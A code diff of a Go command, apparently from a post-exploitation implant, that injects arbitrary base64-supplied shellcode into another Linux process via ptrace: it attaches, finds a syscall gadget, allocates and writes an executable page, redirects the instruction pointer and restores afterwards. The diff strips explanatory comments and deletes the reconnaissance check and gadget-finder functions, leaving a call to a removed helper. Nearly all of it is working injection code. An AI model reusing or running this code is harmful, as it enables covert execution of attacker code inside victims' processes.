@@ -22,11 +22,11 @@ func (c *PtraceInjectCommand) Description() string {
 }
 
 type ptraceInjectArgs struct {
-	Action       string `json:"action"`        // check, inject
-	PID          int    `json:"pid"`           // Target process ID
-	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode
-	Restore      *bool  `json:"restore"`       // Restore original code after execution (default: true)
-	Timeout      int    `json:"timeout"`       // Timeout in seconds waiting for shellcode (default: 30)
+	Action       string `json:"action"`
+	PID          int    `json:"pid"`
+	ShellcodeB64 string `json:"shellcode_b64"`
+	Restore      *bool  `json:"restore"`
+	Timeout      int    `json:"timeout"`
 }
 
 func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
@@ -68,96 +68,6 @@ func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
-func ptraceCheck() structs.CommandResult {
-	var sb strings.Builder
-
-	sb.WriteString("Ptrace Configuration\n")
-	sb.WriteString(strings.Repeat("=", 60) + "\n\n")
-
-	// Check ptrace_scope (Yama LSM)
-	if scope, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
-		val := strings.TrimSpace(string(scope))
-		structs.ZeroBytes(scope)
-		sb.WriteString(fmt.Sprintf("ptrace_scope: %s", val))
-		switch val {
-		case "0":
-			sb.WriteString(" (classic — any process can ptrace same-UID processes)\n")
-		case "1":
-			sb.WriteString(" (restricted — only parent can ptrace child, or CAP_SYS_PTRACE)\n")
-		case "2":
-			sb.WriteString(" (admin-only — requires CAP_SYS_PTRACE)\n")
-		case "3":
-			sb.WriteString(" (disabled — no ptrace allowed)\n")
-		default:
-			sb.WriteString("\n")
-		}
-	} else {
-		sb.WriteString("ptrace_scope: not available (Yama LSM not loaded)\n")
-	}
-
-	sb.WriteString(fmt.Sprintf("\nCurrent UID:  %d\n", os.Getuid()))
-	sb.WriteString(fmt.Sprintf("Current EUID: %d\n", os.Geteuid()))
-
-	if os.Geteuid() == 0 {
-		sb.WriteString("\nRunning as root — ptrace should work on all processes\n")
-	}
-
-	// Show capabilities from /proc/self/status
-	if status, err := os.ReadFile("/proc/self/status"); err == nil {
-		sb.WriteString("\nCapabilities:\n")
-		for _, line := range strings.Split(string(status), "\n") {
-			if strings.HasPrefix(line, "Cap") {
-				sb.WriteString(fmt.Sprintf("  %s\n", line))
-			}
-		}
-		structs.ZeroBytes(status)
-	}
-
-	// List candidate processes (same UID)
-	sb.WriteString("\nCandidate Processes (same UID):\n")
-	entries, _ := os.ReadDir("/proc")
-	uid := os.Getuid()
-	count := 0
-	for _, e := range entries {
-		if !e.IsDir() {
-			continue
-		}
-		var pid int
-		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil {
-			continue
-		}
-		if pid == os.Getpid() {
-			continue
-		}
-		statusPath := fmt.Sprintf("/proc/%d/status", pid)
-		data, err := os.ReadFile(statusPath)
-		if err != nil {
-			continue
-		}
-		var procUID int
-		var procName string
-		for _, line := range strings.Split(string(data), "\n") {
-			if strings.HasPrefix(line, "Name:") {
-				procName = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
-			}
-			if strings.HasPrefix(line, "Uid:") {
-				_, _ = fmt.Sscanf(strings.TrimPrefix(line, "Uid:"), "%d", &procUID)
-			}
-		}
-		structs.ZeroBytes(data)
-		if procUID == uid || os.Geteuid() == 0 {
-			sb.WriteString(fmt.Sprintf("  PID %-7d %s\n", pid, procName))
-			count++
-			if count >= 20 {
-				sb.WriteString("  ... (truncated)\n")
-				break
-			}
-		}
-	}
-
-	return successResult(sb.String())
-}
-
 func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if args.PID <= 0 {
 		return errorResult("Error: valid pid required")
@@ -191,22 +101,18 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
 	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))
 
-	// Verify target process exists
 	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
 		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID))
 	}
 
-	// Lock the OS thread — ptrace requires all operations from the same thread
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	// Step 1: Attach to the process
 	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
 	if err := syscall.PtraceAttach(args.PID); err != nil {
 		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
 	}
 
-	// Wait for the process to stop (SIGSTOP)
 	var ws syscall.WaitStatus
 	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
 		_ = syscall.PtraceDetach(args.PID)
@@ -214,7 +120,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString("[+] Process stopped\n")
 
-	// Step 2: Save original registers
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
 		_ = syscall.PtraceDetach(args.PID)
@@ -222,7 +127,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))
 
-	// Step 3: Find a syscall gadget in the target process
 	syscallAddr, err := findSyscallGadget(args.PID)
 	if err != nil {
 		_ = syscall.PtraceDetach(args.PID)
@@ -230,17 +134,15 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))
 
-	// Step 4: Use ptrace syscall injection to call mmap(RW), write shellcode, then mprotect(RX)
 	pageSize := uint64(4096)
 	scSize := uint64(len(shellcode))
 	if restore {
-		scSize++ // room for INT3
+		scSize++
 	}
 	if scSize > pageSize {
 		pageSize = ((scSize + 4095) / 4096) * 4096
 	}
 
-	// Helper: execute a syscall in the target process via single-step
 	execSyscall := func(sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {
 		regs := origRegs
 		regs.Rip = syscallAddr
@@ -266,7 +168,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		return regs.Rax, nil
 	}
 
-	// 4a: mmap(NULL, pagesize, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
 	rwAddr, err := execSyscall(9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
@@ -280,14 +181,12 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", rwAddr, pageSize))
 
-	// 4b: Build injection code — shellcode + optional INT3 trailer
 	injectionCode := make([]byte, len(shellcode))
 	copy(injectionCode, shellcode)
 	if restore {
 		injectionCode = append(injectionCode, 0xCC)
 	}
 
-	// 4c: Write shellcode to the writable page
 	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
@@ -295,7 +194,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))
 
-	// 4d: mprotect(addr, pagesize, PROT_READ|PROT_EXEC) — make it executable, remove write
 	mprotectRet, err := execSyscall(10, rwAddr, pageSize, 5, 0, 0, 0)
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
@@ -308,15 +206,9 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
 	}
 
-	// Step 5: Set RIP to the shellcode in the now-executable page
-	// CRITICAL: Set Orig_rax to -1 to prevent Linux syscall restart mechanism.
-	// When the target was stopped inside a syscall (e.g., nanosleep), orig_rax
-	// contains the syscall number. If we resume with orig_rax still set, the
-	// kernel backs up RIP by 2 bytes (to re-execute the syscall instruction),
-	// causing SIGSEGV since our shellcode page-2 is not mapped/executable.
 	newRegs := origRegs
 	newRegs.Rip = rwAddr
-	newRegs.Orig_rax = ^uint64(0) // -1: disable syscall restart
+	newRegs.Orig_rax = ^uint64(0)
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
@@ -324,7 +216,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))
 
-	// Step 8: Continue execution
 	sb.WriteString("[*] Continuing execution...\n")
 	if err := syscall.PtraceCont(args.PID, 0); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
@@ -333,7 +224,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 
 	if restore {
-		// Step 9: Wait for INT3 (SIGTRAP) with timeout
 		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
 		stopped := false
 		for time.Now().Before(deadline) {
@@ -362,12 +252,11 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
 		}
 
-		// Step 10: Clean up — munmap the RWX page
 		munmapRegs := origRegs
 		munmapRegs.Rip = syscallAddr
-		munmapRegs.Rax = 11       // SYS_munmap
-		munmapRegs.Rdi = rwAddr   // addr
-		munmapRegs.Rsi = pageSize // length
+		munmapRegs.Rax = 11
+		munmapRegs.Rdi = rwAddr
+		munmapRegs.Rsi = pageSize
 		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
 			if err := syscall.PtraceSingleStep(args.PID); err == nil {
 				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
@@ -375,7 +264,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			}
 		}
 
-		// Step 11: Restore original registers
 		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
 			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
 		} else {
@@ -383,7 +271,6 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		}
 	}
 
-	// Step 12: Detach
 	if err := syscall.PtraceDetach(args.PID); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
 	} else {
@@ -393,77 +280,4 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	sb.WriteString("[+] Ptrace injection completed successfully\n")
 
 	return successResult(sb.String())
-}
-
-// findSyscallGadget scans r-xp memory regions for a syscall instruction (0x0F 0x05).
-// Uses /proc/<pid>/mem for reading, which works on both self and ptrace-attached processes.
-func findSyscallGadget(pid int) (uint64, error) {
-	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
-	data, err := os.ReadFile(mapsPath)
-	if err != nil {
-		return 0, fmt.Errorf("cannot read %s: %w", mapsPath, err)
-	}
-	defer structs.ZeroBytes(data)
-
-	memPath := fmt.Sprintf("/proc/%d/mem", pid)
-	memFile, err := os.Open(memPath)
-	if err != nil {
-		return 0, fmt.Errorf("cannot open %s: %w", memPath, err)
-	}
-	defer memFile.Close()
-
-	for _, line := range strings.Split(string(data), "\n") {
-		if line == "" {
-			continue
-		}
-		parts := strings.Fields(line)
-		if len(parts) < 2 {
-			continue
-		}
-
-		perms := parts[1]
-		if len(perms) < 4 || perms[0] != 'r' || perms[2] != 'x' {
-			continue
-		}
-		// Skip vdso/vsyscall
-		if len(parts) >= 6 {
-			name := parts[len(parts)-1]
-			if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
-				continue
-			}
-		}
-
-		addrParts := strings.Split(parts[0], "-")
-		if len(addrParts) != 2 {
-			continue
-		}
-		var startAddr, endAddr uint64
-		if _, err := fmt.Sscanf(addrParts[0], "%x", &startAddr); err != nil {
-			continue
-		}
-		if _, err := fmt.Sscanf(addrParts[1], "%x", &endAddr); err != nil {
-			continue
-		}
-
-		// Scan this region for syscall instruction (0x0F 0x05)
-		chunkSize := uint64(4096)
-		buf := make([]byte, chunkSize)
-		for addr := startAddr; addr < endAddr-1; addr += chunkSize {
-			readSize := chunkSize
-			if addr+readSize > endAddr {
-				readSize = endAddr - addr
-			}
-			n, err := memFile.ReadAt(buf[:readSize], int64(addr))
-			if err != nil || n < 2 {
-				break
-			}
-			for i := 0; i < n-1; i++ {
-				if buf[i] == 0x0F && buf[i+1] == 0x05 {
-					return addr + uint64(i), nil
-				}
-			}
-		}
-	}
-
-	return 0, fmt.Errorf("no syscall gadget found in process %d", pid)
 }
